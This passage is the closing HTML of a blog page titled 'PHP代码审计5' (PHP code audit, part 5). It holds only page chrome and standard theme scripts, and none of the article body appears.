  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&text=【代码审计】PHP代码审计5"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&is_video=false&description=【代码审计】PHP代码审计5"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计5&body=Check out this article: https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&name=【代码审计】PHP代码审计5&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&t=【代码审计】PHP代码审计5"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
